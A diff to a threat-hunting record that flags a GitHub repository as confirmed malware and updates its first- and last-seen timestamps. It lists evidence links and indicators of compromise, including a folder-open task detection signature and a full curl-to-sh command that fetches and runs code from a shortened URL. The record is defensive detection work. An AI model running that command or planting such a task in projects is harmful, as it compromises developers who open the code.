@@ -21,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/antonver_defiguard-dev.json",
     "reviewer_decision": "",
     "notes": ""
@@ -90,7 +90,7 @@
     "evidence_references": "https://github.com/antonver/defiguard-dev/blob/3d58e0d03764c0bbcf6584e9a66922b294084ce1/.vscode/tasks.json\nhttps://github.com/antonver/defiguard-dev/blob/3d58e0d03764c0bbcf6584e9a66922b294084ce1/server/errorHandler.js#L36\nhttps://github.com/antonver/defiguard-dev/blob/3d58e0d03764c0bbcf6584e9a66922b294084ce1/server/errorHandler.js#L41\nhttps://github.com/antonver/defiguard-dev/blob/3d58e0d03764c0bbcf6584e9a66922b294084ce1/server/controllers/userController.js#L149\nhttps://github.com/antonver/defiguard-dev/blob/3d58e0d03764c0bbcf6584e9a66922b294084ce1/server/controllers/userController.js#L158",
     "verified_iocs": "chvsvr.short.gy\nhttps://chvsvr.short.gy/loTrNg5m\nhttps://chvsvr.short.gy/loTrNg5l\nhttps://chvsvr.short.gy/loTrNg5w\ncurl -L 'https://chvsvr.short.gy/loTrNg5m' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
